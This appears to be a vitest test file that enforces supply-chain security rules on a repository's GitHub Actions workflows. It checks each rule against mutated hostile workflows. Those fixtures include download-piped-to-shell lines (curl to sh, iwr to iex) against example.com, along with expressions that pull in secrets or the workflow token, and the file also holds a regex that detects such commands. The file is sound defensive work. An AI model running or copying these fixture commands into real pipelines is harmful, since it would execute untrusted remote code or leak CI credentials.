import { readdirSync, readFileSync } from 'node:fs'
import { join } from 'node:path'
import { load as loadYaml } from 'js-yaml'
import { describe, expect, it } from 'vitest'

/**
 * The rules every GitHub Actions workflow of this public repository keeps (Phase 17, docs/DECISIONS.md; tightened
 * by the security review, SR-049). On a public repo a push or pull-request trigger lets a stranger's change run here,
 * wider permissions let a run write to the repo, an action named by tag can be changed under us by whoever controls
 * that tag, and a script that is handed text it did not write runs it. A change to any of these is a decision, so it
 * has to change this test too.
 *
 * One function, `workflowProblems`, holds every rule. It runs on each real workflow (which must have none) and on
 * hostile ones below (each of which must trip exactly the rule it was written for), so a rule that quietly stopped
 * working would fail here.
 */

const WORKFLOWS = join(import.meta.dirname, '../../.github/workflows')

/** `actions/<name>@<40 hex>`: GitHub's own actions only, each a commit, which no one can move. */
const PINNED_GITHUB_ACTION = /^actions\/[\w.-]+(\/[\w./-]+)?@[0-9a-f]{40}$/
/** A GitHub-hosted runner. A self-hosted runner on a public repository runs whatever a workflow says, on a machine. */
const HOSTED_RUNNER = /^(windows|macos|ubuntu)-(latest|\d[\w.]*)$/
/** The release workflow names its image: `-latest` moves to a new operating system on GitHub's schedule, mid-release (20.4). */
const NUMBERED_RUNNER = /^(windows|macos|ubuntu)-\d[\w.]*$/
/** The release workflow runs on a pushed version tag and on nothing else (Phase 20, task 20.4): no branch, no button, no input. */
const RELEASE_TRIGGER = JSON.stringify({ push: { tags: ['v*'] } })

/**
 * `manual`: a test build, started by hand, read-only, no token (Phase 17). `release`: runs on a pushed `v*` tag, builds with read-only
 * permissions and no token, and one job, `publish`, may write to the repository to create a DRAFT Release (Phase 20, task 20.4).
 */
type Profile = 'manual' | 'release'
/** The longest an artifact may live: a test build is unannounced, not a release (DECISIONS 2026-10-05). */
const MAX_RETENTION_DAYS = 7

interface Step {
  uses?: string
  run?: string
  with?: Record<string, unknown>
  'continue-on-error'?: unknown
}

interface Job {
  needs?: unknown
  'runs-on'?: unknown
  permissions?: unknown
  uses?: string
  secrets?: unknown
  environment?: unknown
  'continue-on-error'?: unknown
  steps?: Step[]
}

interface Workflow {
  on: unknown
  permissions?: unknown
  jobs: Record<string, Job>
}

/** Every string anywhere in a parsed document, with the key it sits under. */
function strings(value: unknown, key = ''): [string, string][] {
  if (typeof value === 'string') return [[key, value]]
  if (Array.isArray(value)) return value.flatMap((item) => strings(item, key))
  if (typeof value === 'object' && value !== null) {
    return Object.entries(value).flatMap(([name, inner]) => strings(inner, name))
  }

  return []
}

/** Every rule a workflow breaks, as sentences; empty when it breaks none. */
function workflowProblems(workflow: Workflow, profile: Profile = 'manual'): string[] {
  const problems: string[] = []
  const jobs = Object.entries(workflow.jobs)
  const steps = jobs.flatMap(([name, job]) => (job.steps ?? []).map((step) => ({ job: name, step })))

  // Started by hand only: no push or pull-request trigger, so no stranger's change is ever built.
  const triggers = typeof workflow.on === 'string' ? [workflow.on] : Object.keys((workflow.on ?? {}) as object)
  if (profile === 'manual' && JSON.stringify(triggers) !== JSON.stringify(['workflow_dispatch'])) {
    problems.push(`is started by ${triggers.join(', ') || 'nothing'}, not by hand only (workflow_dispatch)`)
  }
  if (profile === 'release' && JSON.stringify(workflow.on) !== RELEASE_TRIGGER) {
    problems.push(`is started by ${JSON.stringify(workflow.on)}, not only by a pushed v* tag`)
  }

  // Reads the repository and nothing more.
  if (JSON.stringify(workflow.permissions) !== JSON.stringify({ contents: 'read' })) problems.push('does not have permissions: { contents: read }')
  for (const [name, job] of jobs) {
    // Only `publish` may write, and only contents (a draft Release); a build job never does.
    const allowed = profile === 'release' && name === 'publish' ? [{ contents: 'read' }, { contents: 'write' }] : [{ contents: 'read' }]
    if (job.permissions !== undefined && !allowed.some((set) => JSON.stringify(set) === JSON.stringify(job.permissions))) {
      problems.push(`job ${name} widens its permissions`)
    }
  }

  // GitHub's own actions, each pinned by commit (a job may call a reusable workflow with `uses`, a step an action).
  const uses = [...jobs.flatMap(([, job]) => (job.uses ? [job.uses] : [])), ...steps.flatMap(({ step }) => (step.uses ? [step.uses] : []))]
  if (uses.length === 0) problems.push('uses no action at all (an empty list would pass every rule below on nothing)')
  for (const use of uses) if (!PINNED_GITHUB_ACTION.test(use)) problems.push(`uses ${use}: not a GitHub-owned action pinned by a 40-character commit`)

  // A GitHub-hosted runner only.
  for (const [name, job] of jobs) {
    if (typeof job['runs-on'] !== 'string' || !HOSTED_RUNNER.test(job['runs-on'])) {
      problems.push(`job ${name} runs on ${JSON.stringify(job['runs-on'])}, not a GitHub-hosted runner`)
    } else if (profile === 'release' && !NUMBERED_RUNNER.test(job['runs-on'])) {
      problems.push(`job ${name} runs on ${job['runs-on']}: a release names its image (windows-2025), never -latest`)
    }
  }

  // The checkout does not leave a token in `.git/config` for the build's scripts to read.
  for (const { job, step } of steps.filter(({ step }) => step.uses?.startsWith('actions/checkout@'))) {
    if (step.with?.['persist-credentials'] !== false) problems.push(`job ${job}: checkout does not set persist-credentials: false`)
  }

  // An artifact is a test build kept for days, not a release.
  for (const { job, step } of steps.filter(({ step }) => step.uses?.startsWith('actions/upload-artifact@'))) {
    const days = step.with?.['retention-days']
    if (typeof days !== 'number' || days < 1 || days > MAX_RETENTION_DAYS) {
      problems.push(`job ${job}: upload-artifact retention-days is ${JSON.stringify(days)}, not 1 to ${MAX_RETENTION_DAYS}`)
    }
  }

  // A script is handed values through `env:`, never pasted: `${{ … }}` in a `run:` is text written into the script
  // before it runs, so whoever sets that value (an input, a branch name, an actor) writes shell. And it fetches and
  // runs nothing it did not pin: no download piped to a shell, no `npx` of a package named on the fly.
  for (const { job, step } of steps.filter(({ step }) => step.run !== undefined)) {
    const run = step.run!
    if (run.includes('${{')) problems.push(`job ${job}: a run: script contains \${{ … }} (hand values through env:)`)
    if (/\b(curl|wget|Invoke-WebRequest|Invoke-RestMethod|iwr|irm|Invoke-Expression|iex)\b/i.test(run)) {
      problems.push(`job ${job}: a run: script downloads or evaluates remote text`)
    }
    if (/\bnpx\b/.test(run)) problems.push(`job ${job}: a run: script uses npx`)
  }

  // The toolchain is the one the repository names, never "whatever is current today" (SR-041): Node comes from `.node-version`,
  // Rust from `rust-toolchain.toml`, and a build resolves its dependencies from the committed lockfiles or fails (`--locked`).
  for (const { job, step } of steps.filter(({ step }) => step.uses?.startsWith('actions/setup-node@'))) {
    if (step.with?.['node-version'] !== undefined) problems.push(`job ${job}: setup-node names a node-version (read .node-version instead)`)
    if (step.with?.['node-version-file'] !== '.node-version') problems.push(`job ${job}: setup-node does not read .node-version`)
  }
  for (const { job, step } of steps.filter(({ step }) => step.run !== undefined)) {
    const run = step.run!
    if (/\brustup\s+(toolchain\s+install|default|update|override)\b/.test(run)) {
      if (/\b(stable|beta|nightly)\b/.test(run)) problems.push(`job ${job}: rustup is given a moving channel (stable, beta or nightly)`)
      if (!run.includes('rust-toolchain.toml')) problems.push(`job ${job}: rustup does not take its version from rust-toolchain.toml`)
    }
    for (const line of run.split('\n')) {
      if (/\b(tauri:build|tauri build|cargo\s+(build|test|run|check|clippy|install|bench))\b/.test(line) && !/--locked\b/.test(line)) {
        problems.push(`job ${job}: \`${line.trim().slice(0, 70)}\` is not run with --locked`)
      }
    }
  }

  // No secret, and no token handed on, in any spelling: the key `secrets:` of a reusable-workflow call
  // (`secrets: inherit`), `${{ secrets.X }}`, `secrets['X']`, `toJSON(secrets)`, `github.token`, `GITHUB_TOKEN`.
  for (const [name, job] of jobs) if (job.secrets !== undefined) problems.push(`job ${name} passes secrets`)
  // The release workflow's `publish` job hands the token to the GitHub CLI as GH_TOKEN, once, to create the draft; nowhere else.
  const rest = Object.fromEntries(Object.entries(workflow).filter(([key]) => key !== 'jobs'))
  const scopes: [string, unknown][] = [['', rest], ...jobs.map(([name, job]): [string, unknown] => [name, job])]
  for (const [scope, value] of scopes) {
    for (const [key, text] of strings(value)) {
      const token = /\bgithub\.token\b|\bGITHUB_TOKEN\b/.test(text)
      const handed = profile === 'release' && scope === 'publish' && key === 'GH_TOKEN' && text === '${{ github.token }}'
      if (/\$\{\{[^}]*\bsecrets\b/.test(text) || (token && !handed)) {
        problems.push(`${key || 'a value'} reaches for a secret or the token: ${text.slice(0, 60)}`)
      }
    }
  }

  // Nothing is allowed to fail quietly, and no environment (with its own secrets and reviewers) is in play.
  for (const [name, job] of jobs) {
    if (job['continue-on-error'] !== undefined) problems.push(`job ${name} sets continue-on-error`)
    if (job.environment !== undefined) problems.push(`job ${name} uses an environment`)
  }
  for (const { job, step } of steps) if (step['continue-on-error'] !== undefined) problems.push(`job ${job}: a step sets continue-on-error`)

  if (profile === 'release') problems.push(...releaseProblems(jobs, steps))

  return problems
}

/**
 * What only the release workflow must do (Phase 20, task 20.4). A Release is created as a DRAFT and never published or edited by the
 * workflow, so going public is a human click on GitHub; the commit being released must be on `main`, and its version must be the tag's.
 */
function releaseProblems(jobs: [string, Job][], steps: { job: string; step: Step }[]): string[] {
  const problems: string[] = []
  const publish = jobs.find(([name]) => name === 'publish')?.[1]

  if (publish === undefined) problems.push('has no job named publish (the only job that may write)')
  else if (publish.needs === undefined) problems.push('job publish does not wait for the builds (needs)')

  const runs = steps.filter(({ step }) => step.run !== undefined).map(({ job, step }) => ({ job, run: step.run! }))
  // Every job that builds an installer checks, before building, that the tag is a release of main at this version.
  for (const [name] of jobs.filter(([name]) => name !== 'publish')) {
    const own = runs.filter(({ job }) => job === name)
    if (!own.some(({ run }) => /git merge-base --is-ancestor/.test(run))) problems.push(`job ${name} never checks that the tagged commit is on main (git merge-base --is-ancestor)`)
    if (!own.some(({ run }) => /\b(Get-Content|plutil|jq|node)\b[^\n]*package\.json/.test(run))) problems.push(`job ${name} never checks that the tag matches the version in package.json`)
  }

  for (const { job, run } of runs) {
    if (/\bgh\s+release\b/.test(run) && job !== 'publish') problems.push(`job ${job}: uses gh release (only publish creates a Release)`)
    if (/\bgh\s+release\s+create\b/.test(run) && !/--draft(?!=)/.test(run)) problems.push(`job ${job}: gh release create without --draft`)
    if (/--draft=false|\bgh\s+release\s+(edit|delete)\b/.test(run)) problems.push(`job ${job}: edits or deletes a Release or un-drafts it (publishing is a human click)`)
  }

  return problems
}

const sha = (letter: string) => letter.repeat(40)

/** A workflow that breaks no rule; each hostile one below changes one thing in it. */
const GOOD = `
name: Test
on:
  workflow_dispatch:
    inputs:
      profile:
        type: choice
        options: [release, debug]
permissions:
  contents: read
jobs:
  build:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@${sha('a')} # v1
        with:
          persist-credentials: false
      - name: Build
        env:
          PROFILE: \${{ inputs.profile || 'release' }}
        run: npm ci --ignore-scripts
      - uses: actions/setup-node@${sha('c')} # v1
        with:
          node-version-file: .node-version
      - name: Rust
        shell: pwsh
        run: |
          $channel = (Select-String -Path rust-toolchain.toml -Pattern '^channel').Line
          rustup toolchain install $channel --profile minimal --no-self-update
      - name: Installer
        shell: pwsh
        run: |
          if ($true) {
            npm run tauri:build -w @listulator/desktop -- --bundles nsis --debug -- --locked
          } else {
            npm run tauri:build -w @listulator/desktop -- --bundles nsis -- --locked
          }
      - uses: actions/upload-artifact@${sha('b')} # v1
        with:
          name: x
          path: y
          retention-days: 3
`

const parse = (text: string) => loadYaml(text) as Workflow

describe('the rules for a workflow, proven on hostile workflows', () => {
  it('accept a workflow that breaks none', () => {
    expect(workflowProblems(parse(GOOD))).toEqual([])
  })

  const hostile: [string, (text: string) => string, RegExp][] = [
    ['a pull request trigger', (t) => t.replace('  workflow_dispatch:', '  pull_request:\n  workflow_dispatch:'), /not by hand only/],
    ['a push trigger instead', (t) => t.replace('  workflow_dispatch:\n    inputs:\n      profile:\n        type: choice\n        options: [release, debug]', '  push:'), /not by hand only/],
    ['write permission', (t) => t.replace('contents: read', 'contents: write'), /permissions: \{ contents: read \}/],
    ['no permissions at all', (t) => t.replace('permissions:\n  contents: read\n', ''), /permissions: \{ contents: read \}/],
    ['a job that widens its permissions', (t) => t.replace('    runs-on: windows-latest', '    runs-on: windows-latest\n    permissions:\n      contents: write'), /widens its permissions/],
    ['an action named by tag', (t) => t.replace(`actions/checkout@${sha('a')} # v1`, 'actions/checkout@v4'), /not a GitHub-owned action pinned/],
    ['an action from another owner, pinned', (t) => t.replace(`actions/upload-artifact@${sha('b')}`, `someone/else@${sha('b')}`), /not a GitHub-owned action pinned/],
    ['a local action', (t) => t.replace(`actions/upload-artifact@${sha('b')}`, './.github/actions/mine'), /not a GitHub-owned action pinned/],
    ['a docker action', (t) => t.replace(`actions/upload-artifact@${sha('b')}`, 'docker://alpine:3'), /not a GitHub-owned action pinned/],
    ['a self-hosted runner', (t) => t.replace('windows-latest', 'self-hosted'), /not a GitHub-hosted runner/],
    ['a runner list with self-hosted', (t) => t.replace('windows-latest', '[self-hosted, linux]'), /not a GitHub-hosted runner/],
    ['a runner chosen by an expression', (t) => t.replace('windows-latest', '${{ inputs.runner }}'), /not a GitHub-hosted runner/],
    ['a checkout that keeps credentials', (t) => t.replace('          persist-credentials: false', '          fetch-depth: 0'), /persist-credentials: false/],
    ['a checkout that sets it true', (t) => t.replace('persist-credentials: false', 'persist-credentials: true'), /persist-credentials: false/],
    ['an artifact kept a month', (t) => t.replace('retention-days: 3', 'retention-days: 30'), /retention-days/],
    ['an artifact with no retention set', (t) => t.replace('          retention-days: 3\n', ''), /retention-days/],
    ['an input pasted into a script', (t) => t.replace('run: npm ci --ignore-scripts', "run: echo ${{ inputs.profile }}"), /contains \$\{\{/],
    ['a branch name pasted into a script', (t) => t.replace('run: npm ci --ignore-scripts', "run: echo ${{ github.head_ref }}"), /contains \$\{\{/],
    ['an output pasted into a script', (t) => t.replace('run: npm ci --ignore-scripts', "run: echo ${{ steps.x.outputs.y }}"), /contains \$\{\{/],
    ['a download piped to a shell', (t) => t.replace('run: npm ci --ignore-scripts', 'run: curl -fsSL https://example.com/i.sh | sh'), /downloads or evaluates/],
    ['a PowerShell download evaluated', (t) => t.replace('run: npm ci --ignore-scripts', "run: iwr https://example.com/i.ps1 | iex"), /downloads or evaluates/],
    ['npx of a package named on the fly', (t) => t.replace('run: npm ci --ignore-scripts', 'run: npx some-package'), /uses npx/],
    ['a secret in the usual spelling', (t) => t.replace("PROFILE: ${{ inputs.profile || 'release' }}", 'TOKEN: ${{ secrets.TOKEN }}'), /secret or the token/],
    ['a secret by index', (t) => t.replace("PROFILE: ${{ inputs.profile || 'release' }}", "TOKEN: ${{ secrets['TOKEN'] }}"), /secret or the token/],
    ['all secrets as JSON', (t) => t.replace("PROFILE: ${{ inputs.profile || 'release' }}", 'ALL: ${{ toJSON(secrets) }}'), /secret or the token/],
    ['the workflow token handed to a step', (t) => t.replace("PROFILE: ${{ inputs.profile || 'release' }}", 'T: ${{ github.token }}'), /secret or the token/],
    ['the token under its usual name', (t) => t.replace("PROFILE: ${{ inputs.profile || 'release' }}", 'GITHUB_TOKEN: ${{ github.token }}'), /secret or the token/],
    ['GITHUB_TOKEN read in a script', (t) => t.replace('run: npm ci --ignore-scripts', 'run: echo $env:GITHUB_TOKEN'), /secret or the token/],
    ['secrets: inherit on a job', (t) => t.replace('    runs-on: windows-latest', '    runs-on: windows-latest\n    secrets: inherit'), /passes secrets/],
    ['a job that may fail quietly', (t) => t.replace('    runs-on: windows-latest', '    runs-on: windows-latest\n    continue-on-error: true'), /continue-on-error/],
    ['a step that may fail quietly', (t) => t.replace('        run: npm ci --ignore-scripts', '        continue-on-error: true\n        run: npm ci --ignore-scripts'), /continue-on-error/],
    ['an environment', (t) => t.replace('    runs-on: windows-latest', '    runs-on: windows-latest\n    environment: release'), /uses an environment/],
    ['a node version named in the workflow', (t) => t.replace('node-version-file: .node-version', 'node-version: 26'), /names a node-version/],
    ['a node version range', (t) => t.replace('node-version-file: .node-version', 'node-version: ">=20"\n          node-version-file: .node-version'), /names a node-version/],
    ['a node version file that is not .node-version', (t) => t.replace('node-version-file: .node-version', 'node-version-file: package.json'), /does not read .node-version/],
    ['rustup given stable', (t) => t.replace('rustup toolchain install $channel --profile minimal --no-self-update', 'rustup toolchain install stable --profile minimal rust-toolchain.toml'), /moving channel/],
    ['rustup default stable', (t) => t.replace('rustup toolchain install $channel --profile minimal --no-self-update', 'rustup default stable # rust-toolchain.toml'), /moving channel/],
    ['rustup given a nightly', (t) => t.replace('rustup toolchain install $channel --profile minimal --no-self-update', 'rustup toolchain install nightly # rust-toolchain.toml'), /moving channel/],
    ['rustup with a version written in the workflow, not read from the file', (t) => t.replace("$channel = (Select-String -Path rust-toolchain.toml -Pattern '^channel').Line\n          rustup toolchain install $channel", 'rustup toolchain install 1.98.1'), /does not take its version from rust-toolchain.toml/],
    ['a tauri build without --locked (the release branch)', (t) => t.replace('--bundles nsis -- --locked', '--bundles nsis'), /not run with --locked/],
    ['a tauri build without --locked (the debug branch)', (t) => t.replace('--debug -- --locked', '--debug'), /not run with --locked/],
    ['a cargo build without --locked', (t) => t.replace('run: npm ci --ignore-scripts', 'run: cargo build --release'), /not run with --locked/],
    ['a cargo test without --locked', (t) => t.replace('run: npm ci --ignore-scripts', 'run: cargo test'), /not run with --locked/],
  ]

  it.each(hostile)('refuse %s', (_name, change, expected) => {
    const changed = change(GOOD)

    expect(changed).not.toBe(GOOD)
    expect(workflowProblems(parse(changed)).join(' | ')).toMatch(expected)
  })
})


/** A release workflow that breaks no rule; each hostile one below changes one thing in it. */
const GOOD_RELEASE = `
name: Release
on:
  push:
    tags: ['v*']
permissions:
  contents: read
jobs:
  build:
    runs-on: windows-2025
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@${sha('a')} # v1
        with:
          persist-credentials: false
          fetch-depth: 0
      - name: The tag is a release of main
        shell: pwsh
        env:
          TAG: \${{ github.ref_name }}
        run: |
          git merge-base --is-ancestor $env:GITHUB_SHA origin/main
          $version = (Get-Content package.json | ConvertFrom-Json).version
          if ("v$version" -ne $env:TAG) { throw 'tag and version differ' }
      - uses: actions/setup-node@${sha('c')} # v1
        with:
          node-version-file: .node-version
      - name: Rust
        shell: pwsh
        run: |
          $channel = (Select-String -Path rust-toolchain.toml -Pattern '^channel').Line
          rustup toolchain install $channel --profile minimal --no-self-update
      - name: Installer
        shell: pwsh
        run: npm run tauri:build -w @listulator/desktop -- --bundles nsis -- --locked
      - uses: actions/upload-artifact@${sha('b')} # v1
        with:
          name: installer
          path: x
          retention-days: 3
  build-macos:
    runs-on: macos-15
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@${sha('a')} # v1
        with:
          persist-credentials: false
          fetch-depth: 0
      - name: The tag is a release of main
        env:
          TAG: \${{ github.ref_name }}
        run: |
          git merge-base --is-ancestor "$GITHUB_SHA" origin/main
          test "v$(node -p "require('./package.json').version")" = "$TAG"
      - name: Installer
        run: npm run tauri:build -w @listulator/desktop -- --bundles app,dmg -- --locked
      - uses: actions/upload-artifact@${sha('b')} # v1
        with:
          name: dmg
          path: y
          retention-days: 3
  publish:
    needs: [build, build-macos]
    runs-on: ubuntu-24.04
    permissions:
      contents: write
    steps:
      - uses: actions/download-artifact@${sha('d')} # v1
        with:
          name: installer
      - name: Draft the Release
        env:
          GH_TOKEN: \${{ github.token }}
          TAG: \${{ github.ref_name }}
        run: |
          sha256sum * > SHA256SUMS
          gh release create "$TAG" --draft --verify-tag --title "Listulator $TAG" --notes "Draft" *
`

describe('the rules for the release workflow, proven on hostile workflows', () => {
  const release = (text: string) => workflowProblems(parse(text), 'release')

  it('accept a release workflow that breaks none', () => {
    expect(release(GOOD_RELEASE)).toEqual([])
  })

  const hostile: [string, (text: string) => string, RegExp][] = [
    ['a branch trigger as well', (t) => t.replace("    tags: ['v*']", "    tags: ['v*']\n    branches: [main]"), /not only by a pushed v\* tag/],
    ['a push to any branch instead of a tag', (t) => t.replace("    tags: ['v*']", '    branches: [main]'), /not only by a pushed v\* tag/],
    ['a pull request trigger as well', (t) => t.replace('  push:', '  pull_request:\n  push:'), /not only by a pushed v\* tag/],
    ['a button with a debug input', (t) => t.replace('  push:', '  workflow_dispatch:\n    inputs:\n      debug:\n        type: boolean\n  push:'), /not only by a pushed v\* tag/],
    ['any tag, not only v*', (t) => t.replace("tags: ['v*']", "tags: ['*']"), /not only by a pushed v\* tag/],
    ['write permission for the whole workflow', (t) => t.replace('permissions:\n  contents: read\njobs:', 'permissions:\n  contents: write\njobs:'), /permissions: \{ contents: read \}/],
    ['write permission in the build job', (t) => t.replace('    runs-on: windows-2025\n    permissions:\n      contents: read', '    runs-on: windows-2025\n    permissions:\n      contents: write'), /job build widens/],
    ['an id-token in the build job', (t) => t.replace('    runs-on: windows-2025\n    permissions:\n      contents: read', '    runs-on: windows-2025\n    permissions:\n      contents: read\n      id-token: write'), /job build widens/],
    ['more than contents in the publish job', (t) => t.replace('      contents: write', '      contents: write\n      attestations: write'), /job publish widens/],
    ['a moving runner image', (t) => t.replace('windows-2025', 'windows-latest'), /names its image/],
    ['the token in the build job', (t) => t.replace('          TAG: ${{ github.ref_name }}\n        run: |\n          git merge', '          TAG: ${{ github.ref_name }}\n          GH_TOKEN: ${{ github.token }}\n        run: |\n          git merge'), /secret or the token/],
    ['the token under another name in publish', (t) => t.replace('GH_TOKEN: ${{ github.token }}', 'OTHER: ${{ github.token }}'), /secret or the token/],
    ['a secret in publish', (t) => t.replace('GH_TOKEN: ${{ github.token }}', 'GH_TOKEN: ${{ secrets.PAT }}'), /secret or the token/],
    ['an environment', (t) => t.replace('  publish:\n    needs: [build, build-macos]', '  publish:\n    needs: [build, build-macos]\n    environment: release'), /uses an environment/],
    ['an action named by tag', (t) => t.replace(`actions/download-artifact@${sha('d')} # v1`, 'actions/download-artifact@v8'), /not a GitHub-owned action pinned/],
    ['an action from another owner', (t) => t.replace(`actions/download-artifact@${sha('d')}`, `softprops/action-gh-release@${sha('d')}`), /not a GitHub-owned action pinned/],
    ['a Release that is not a draft', (t) => t.replace('--draft ', ''), /without --draft/],
    ['a Release published after it is drafted', (t) => t.replace('--draft ', '--draft=false '), /un-drafts/],
    ['a Release edited afterwards', (t) => t.replace('sha256sum * > SHA256SUMS', 'gh release edit "$TAG" --latest\n          sha256sum * > SHA256SUMS'), /edits or deletes/],
    ['gh release in the build job', (t) => t.replace('          git merge-base', '          gh release list\n          git merge-base'), /uses gh release/],
    ['no check that the commit is on main', (t) => t.replace('git merge-base --is-ancestor $env:GITHUB_SHA origin/main', 'git log -1'), /on main/],
    ['no check that the tag is the version', (t) => t.replace('package.json', 'something.json'), /matches the version/],
    ['the macOS job without the ancestry check', (t) => t.replace('git merge-base --is-ancestor "$GITHUB_SHA" origin/main', 'git log -1'), /job build-macos never checks.*on main/],
    ['the macOS job without the version check', (t) => t.replace("test \"v$(node -p \"require('./package.json').version\")\" = \"$TAG\"", 'true'), /job build-macos never checks.*version in package.json/],
    ['a moving macOS image', (t) => t.replace('macos-15', 'macos-latest'), /names its image/],
    ['a macOS build that may write', (t) => t.replace('  build-macos:\n    runs-on: macos-15\n    permissions:\n      contents: read', '  build-macos:\n    runs-on: macos-15\n    permissions:\n      contents: write'), /job build-macos widens/],
    ['no publish job', (t) => t.replace('  publish:', '  other:'), /no job named publish/],
    ['a publish job that does not wait', (t) => t.replace('    needs: [build, build-macos]\n', ''), /does not wait/],
    ['the tag pasted into a script', (t) => t.replace('gh release create "$TAG"', 'gh release create ${{ github.ref_name }}'), /contains \$\{\{/],
    ['an artifact kept a month', (t) => t.replace('retention-days: 3', 'retention-days: 30'), /retention-days/],
    ['a build without --locked', (t) => t.replace('--bundles nsis -- --locked', '--bundles nsis'), /not run with --locked/],
  ]

  it.each(hostile)('refuse %s', (_name, change, expected) => {
    const changed = change(GOOD_RELEASE)

    expect(changed).not.toBe(GOOD_RELEASE)
    expect(release(changed).join(' | ')).toMatch(expected)
  })

  it('does not let the manual workflow have the release privileges: its publish job may not write, nor may it use the token', () => {
    expect(workflowProblems(parse(GOOD_RELEASE), 'manual').length).toBeGreaterThan(0)
  })
})

describe('GitHub Actions workflows', () => {
  const workflows = readdirSync(WORKFLOWS)
    .filter((name) => /\.ya?ml$/.test(name))
    .map((name) => ({ name, workflow: loadYaml(readFileSync(join(WORKFLOWS, name), 'utf8')) as Workflow }))

  it('exist (an empty folder would make every rule below pass on nothing)', () => {
    expect(workflows.map((entry) => entry.name)).toEqual(expect.arrayContaining(['desktop-windows.yml', 'release.yml']))
  })

  // `release.yml` is judged by the release rules; any other workflow, including one added later, by the strict manual ones.
  it.each(workflows)('$name breaks none of the rules', ({ name, workflow }) => {
    expect(workflowProblems(workflow, name === 'release.yml' ? 'release' : 'manual')).toEqual([])
  })
})

/**
 * The versions the repository builds with are written down once each and are exact (security review, Phase 19, SR-041): the compiler in
 * `rust-toolchain.toml`, Node in `.node-version`. The workflow reads both (the rules above), Cargo's own `rust-version` agrees with the
 * compiler, so a bump is one deliberate commit that changes these files together and says why in docs/DECISIONS.md.
 */
describe('the pinned toolchain', () => {
  const ROOT = join(import.meta.dirname, '../..')
  const EXACT = /^\d+\.\d+\.\d+$/
  const read = (path: string) => readFileSync(join(ROOT, path), 'utf8')
  const toolchain = read('rust-toolchain.toml')
  const channel = /^channel\s*=\s*"([^"]+)"/m.exec(toolchain)?.[1]

  it('names Node exactly, once, in .node-version', () => {
    expect(read('.node-version').trim()).toMatch(EXACT)
  })

  it('names the Rust compiler exactly, once, in rust-toolchain.toml, with the minimal profile', () => {
    expect(channel).toMatch(EXACT)
    expect(toolchain).toMatch(/^profile\s*=\s*"minimal"/m)
    // The settings, not the comments (which explain why "stable" is not used).
    expect(toolchain.replace(/^\s*#.*$/gm, '')).not.toMatch(/\b(stable|beta|nightly)\b/)
  })

  it('has Cargo.toml say the same compiler as its minimum (a lower number was never tried)', () => {
    expect(/^rust-version\s*=\s*"([^"]+)"/m.exec(read('apps/desktop/src-tauri/Cargo.toml'))?.[1]).toBe(channel)
  })

  it('is what the root package says it runs on: Node at the version file or above within the same major', () => {
    const engines = (JSON.parse(read('package.json')) as { engines?: { node?: string } }).engines?.node ?? ''
    const major = Number(read('.node-version').trim().split('.')[0])

    expect(engines).toMatch(/^>=\d+/)
    expect(Number(engines.replace(/^>=/, ''))).toBeLessThanOrEqual(major)
  })
})

